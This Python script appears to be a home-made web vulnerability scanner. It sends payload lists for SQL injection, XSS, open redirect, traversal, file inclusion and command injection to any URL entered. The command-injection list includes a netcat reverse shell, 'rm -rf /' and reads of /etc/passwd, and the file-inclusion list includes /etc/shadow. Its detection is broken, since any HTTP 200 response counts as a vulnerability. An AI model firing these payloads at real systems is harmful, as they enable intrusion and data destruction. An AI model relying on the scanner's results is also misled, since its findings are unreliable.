import requests
from bs4 import BeautifulSoup
import logging

# Configurar logging
logging.basicConfig(filename='scanner.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

class WebAppScanner:
    def __init__(self, url):
        self.url = url
        self.results = {
            'sql_injection': False,
            'xss': False,
            'csrf': False,
            'open_redirect': False,
            'directory_traversal': False,
            'command_injection': False,
            'lfi': False
        }
        logging.info(f'Initialized scanner for {url}')

    def scan(self):
        logging.info('Starting scan')
        self.scan_sql_injection()
        self.scan_xss()
        self.scan_csrf()
        self.scan_open_redirect()
        self.scan_directory_traversal()
        self.scan_command_injection()
        self.scan_lfi()
        logging.info('Scan completed')
        return self.results

    def scan_sql_injection(self):
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' ({",
            "' OR 1=1 --",
            "' OR 'a'='a",
            "' OR 1=1#",
            "' OR ' ' = ' ",
            "1' ORDER BY 1-- ",
            "1' UNION SELECT NULL, NULL-- ",
            "' OR 'x'='x",
            "1 AND 1=1",
            "1' AND '1'='1",
            "1 OR 1=1"
        ]
        for payload in payloads:
            test_url = f"{self.url}?q={payload}"
            logging.info(f"Testing SQL Injection with payload: {payload}")
            response = requests.get(test_url)
            logging.info(f"Request URL: {test_url} | Response Code: {response.status_code}")
            if response.status_code == 200:
                self.results['sql_injection'] = True
                logging.warning(f"SQL Injection vulnerability found with payload: {payload}")
                break

    def scan_xss(self):
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<img src='javascript:alert(\"XSS\")'>",
            "<svg><script>alert('XSS')</script></svg>",
            "<math><mtext></mtext><script>alert('XSS')</script></math>",
            "<form><button formaction=javascript:alert('XSS')>CLICK ME</button></form>",
            "<video><source onerror=alert('XSS')></video>"
        ]
        for payload in payloads:
            test_url = f"{self.url}?q={payload}"
            logging.info(f"Testing XSS with payload: {payload}")
            response = requests.get(test_url)
            logging.info(f"Request URL: {test_url} | Response Code: {response.status_code}")
            if response.status_code == 200:
                self.results['xss'] = True
                logging.warning(f"XSS vulnerability found with payload: {payload}")
                break

    def scan_csrf(self):
        logging.info("Testing CSRF vulnerability")
        response = requests.get(self.url)
        logging.info(f"Request URL: {self.url} | Response Code: {response.status_code}")
        
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            forms = soup.find_all('form')
            if forms:
                for form in forms:
                    action = form.get('action')
                    method = form.get('method', 'get').lower()
                    inputs = form.find_all('input')
                    
                    has_csrf_token = any(input.get('name') == 'csrf_token' for input in inputs)
                    if not has_csrf_token:
                        if method == 'post':
                            form_data = {input.get('name'): input.get('value', 'test') for input in inputs if input.get('name')}
                            test_url = self.url if action.startswith('/') else action
                            logging.info(f"Testing CSRF on form action: {test_url} with data: {form_data}")
                            post_response = requests.post(test_url, data=form_data)
                            logging.info(f"POST Request URL: {test_url} | Response Code: {post_response.status_code}")
                            if post_response.status_code == 200:
                                self.results['csrf'] = True
                                logging.warning("CSRF vulnerability found")
                                break
            else:
                logging.info("No forms found on the page")
        else:
            logging.error(f"Failed to retrieve the page, response code: {response.status_code}")

    def scan_open_redirect(self):
        payloads = [
            'http://evil.com',
            'https://evil.com',
            '//evil.com',
            '/\\evil.com',
            '/%09/e.vil.com',
            '///evil.com',
            '/\/evil.com',
            '/.%0devil.com',
            'http://www.evil.com'
        ]
        for payload in payloads:
            test_url = f"{self.url}?next={payload}"
            logging.info(f"Testing Open Redirect with payload: {payload}")
            response = requests.get(test_url, allow_redirects=False)
            logging.info(f"Request URL: {test_url} | Response Code: {response.status_code}")
            if response.status_code == 200:
                self.results['open_redirect'] = True
                logging.warning(f"Open Redirect vulnerability found with payload: {payload}")
                break

    def scan_directory_traversal(self):
        payloads = [
            '../',
            '..\\',
            '/etc/passwd',
            'C:\\windows\\system32\\',
            '.../',
            '....//',
            '/../',
            '/../../etc/passwd',
            '/../../../../windows/system32',
            '...\\',
            '....\\\\',
            '\\..\\',
            '\\..\\..\\..\\..\\windows\\system32',
            '\\\\..\\\\..\\\\..\\\\etc\\\\passwd'
        ]
        for payload in payloads:
            test_url = f"{self.url}/{payload}"
            logging.info(f"Testing Directory Traversal with payload: {payload}")
            response = requests.get(test_url)
            logging.info(f"Request URL: {test_url} | Response Code: {response.status_code}")
            if response.status_code == 200:
                self.results['directory_traversal'] = True
                logging.warning(f"Directory Traversal vulnerability found with payload: {payload}")
                break

    def scan_command_injection(self):
        payloads = [
            "; ls",
            "& dir",
            "| whoami",
            "&& cat /etc/passwd",
            "| ping -c 1 google.com",
            "`id`",
            "$(whoami)",
            "| nc -e /bin/sh 192.168.0.1 1234",
            "& nslookup google.com",
            "| rm -rf /"
        ]
        for payload in payloads:
            test_url = f"{self.url}?cmd={payload}"
            logging.info(f"Testing Command Injection with payload: {payload}")
            response = requests.get(test_url)
            logging.info(f"Request URL: {test_url} | Response Code: {response.status_code}")
            if response.status_code == 200:
                self.results['command_injection'] = True
                logging.warning(f"Command Injection vulnerability found with payload: {payload}")
                break

    def scan_lfi(self):
        payloads = [
            "etc/passwd",
            "/etc/passwd",
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "/etc/shadow",
            "../windows/system32/drivers/etc/hosts",
            "../boot.ini",
            "../../boot.ini",
            "../../../boot.ini",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//....//windows//system32//drivers//etc//hosts"
        ]
        for payload in payloads:
            test_url = f"{self.url}?file={payload}"
            logging.info(f"Testing LFI with payload: {payload}")
            response = requests.get(test_url)
            logging.info(f"Request URL: {test_url} | Response Code: {response.status_code}")
            if response.status_code == 200:
                self.results['lfi'] = True
                logging.warning(f"LFI vulnerability found with payload: {payload}")
                break

# Ejecutar el esc√°ner
if __name__ == "__main__":
    url = input("Enter the URL to scan: ").strip()
    scanner = WebAppScanner(url)
    results = scanner.scan()
    print("Scan results:", results)
















